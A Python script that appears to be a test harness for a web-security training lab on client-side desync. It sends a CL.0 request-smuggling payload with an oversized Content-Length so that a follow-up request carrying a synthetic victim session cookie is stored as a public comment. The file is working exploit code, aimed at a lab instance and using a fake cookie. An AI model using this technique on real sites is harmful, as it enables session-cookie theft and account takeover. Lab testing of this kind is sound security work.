#!/usr/bin/env python3
"""Live harness for the 'Client-side desync' mechanism, no victim required.

Drives the phases a solved instance can no longer exercise through the lab
checker: vector confirmation, the control request, and the desync + comment
gadget with a *synthetic* browser follow-up carrying a fake victim cookie.  If
the fake value shows up in a public comment, the whole server-side chain
(CL.0 handler -> leftover bytes parsed as a request -> swollen Content-Length ->
appended request headers stored as comment text) is proven on this instance.

    uv run python smoke_paths.py --url "https://<LAB-ID>.web-security-academy.net"
"""
from __future__ import annotations

import argparse
import random
import re
import socket
import ssl
import sys
import time

import requests

from solve import LabSolver


def desync_poc(s: LabSolver, marker: str, slack: int) -> tuple[bool, str]:
    """Outer POST / + smuggled comment request + synthetic follow-up request."""
    body = (f"csrf={s.csrf}&postId={s.post_id}&name={marker}"
            f"&email=a%40b.com&website=&comment=")
    head = (f"POST {s.prefix}/post/comment HTTP/1.1\r\nHost: {s.host}\r\n"
            f"Cookie: session={s.own_session}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body) + slack}\r\n"
            f"Connection: keep-alive\r\n\r\n")
    smuggled = head + body
    outer = (f"POST / HTTP/1.1\r\nHost: {s.host}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
             f"Content-Length: {len(smuggled)}\r\nConnection: keep-alive\r\n\r\n")

    fake = "SMOKE" + "".join(random.choice("abcdefghijkmnpqrstuvwxyz23456789")
                             for _ in range(26))
    follow = (
        "GET / HTTP/1.1\r\n"
        f"Host: {s.host}\r\n"
        "Connection: keep-alive\r\n"
        'sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"\r\n'
        "sec-ch-ua-mobile: ?0\r\n"
        'sec-ch-ua-platform: "Linux"\r\n'
        "Upgrade-Insecure-Requests: 1\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) HeadlessChrome/145.0.0.0 Safari/537.36\r\n"
        "Accept: */*\r\n"
        "Sec-Fetch-Site: cross-site\r\n"
        "Sec-Fetch-Mode: no-cors\r\n"
        "Sec-Fetch-Dest: empty\r\n"
        "Accept-Encoding: gzip, deflate, br, zstd\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        f"Cookie: session={fake}; _lab_analytics=" + "A" * 600 + "\r\n\r\n")

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(socket.create_connection((s.host, 443), timeout=10),
                           server_hostname=s.host)
    s.requests += 2
    try:
        sock.settimeout(3.0)
        sock.sendall((outer + smuggled).encode())
        first = b""
        while b"\r\n\r\n" not in first:
            chunk = sock.recv(65536)
            if not chunk:
                break
            first += chunk
        status = first.split(b"\r\n", 1)[0].decode("latin1")
        print(f"    outer POST / -> {status}")
        sock.sendall(follow.encode())
        out = b""
        t0 = time.monotonic()
        try:
            while time.monotonic() - t0 < 3:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass
        print(f"    follow-up request -> {len(out)} bytes back, statuses "
              f"{re.findall(rb'HTTP/1.1 \\d+', out)}")
    finally:
        sock.close()

    time.sleep(0.5)
    for text in s.comments():
        if marker in text and fake in text:
            return True, fake
    return False, fake


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--slack", type=int, default=700,
                    help="Content-Length slack; must reach the synthetic Cookie header")
    args = ap.parse_args()

    s = LabSolver(args.url, wait=1, verbose=True)
    print(f"[1] lab widget solved: {s.status_solved()}")
    s.discover()
    s.own_comment_form()
    print(f"[2] prefix={s.prefix!r} postId={s.post_id} session={s.own_session[:8]}…")
    s.confirm_vector()
    marker = "SMOKE" + "".join(random.choice("abcdefghijkmnpqrstuvwxyz23456789")
                               for _ in range(6))
    print(f"[3] desync + comment gadget (marker {marker}, slack +{args.slack})")
    ok, fake = desync_poc(s, marker, args.slack)
    print(f"[4] fake victim session {fake} found in a public comment: {ok}")
    print(f"[=] HTTP requests: {s.requests}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
